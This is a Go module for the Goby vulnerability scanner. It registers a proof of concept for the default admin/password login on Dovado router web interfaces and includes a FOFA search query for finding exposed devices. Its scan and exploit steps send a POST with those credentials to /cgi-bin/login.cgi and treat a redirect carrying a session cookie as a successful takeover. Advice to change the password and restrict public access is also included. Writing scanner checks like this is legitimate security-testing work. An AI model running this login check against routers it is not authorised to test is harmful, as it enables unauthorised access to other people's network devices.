package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dovado Router Default Password",
    "Description": "<p>Dovado routers support USB modems for 4G/LTE and 3G mobile broadband. Just plug the modem into your Dovado router and share your internet connection over WiFi in no time!</p><p>The router web interface has a default password of admin/password.</p>",
    "Product": "Dovado-Router",
    "Homepage": "http://www.commsoft.ie/",
    "DisclosureDate": "2022-10-20",
    "Author": "chuanqiu",
    "FofaQuery": "title==\"Dovado Web Configuration Pages\"",
    "GobyQuery": "title==\"Dovado Web Configuration Pages\"",
    "Level": "1",
    "Impact": "<p>Dovado routers have default passwords. Attackers can use the default password admin/password to log in to the system background, perform other sensitive operations, and obtain more sensitive data.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/login.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "LOGINUNAME=admin&LOGINPASSWD=password"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "umrsession",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "getcfg.cgi?home",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/login.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "LOGINUNAME=admin&LOGINPASSWD=password"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "umrsession",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "getcfg.cgi?home",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:password"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "Dovado Router 默认口令",
            "Product": "Dovado-Router",
            "Description": "<p>Dovado 路由器支持用于 4G/LTE 和 3G 移动宽带的 USB 调制解调器。只需将调制解调器插入您的 Dovado 路由器，即可立即通过 WiFi 共享互联网连接！<br></p><p>该路由器 web界面存在默认口令admin/password。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。</p><p>2、如非必要，禁止公网访问该管理系统。</p>",
            "Impact": "<p>Dovado路由器存在默认口令，攻击者可利用默认口令admin/password登录系统后台，执行其他敏感操作，获取更多敏感数据。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Dovado Router Default Password",
            "Product": "Dovado-Router",
            "Description": "<p>Dovado routers support USB modems for 4G/LTE and 3G mobile broadband. Just plug the modem into your Dovado router and share your internet connection over WiFi in no time!</p><p>The router web interface has a default password of admin/password.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
            "Impact": "<p>Dovado routers have default passwords. Attackers can use the default password admin/password to log in to the system background, perform other sensitive operations, and obtain more sensitive data.<br><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

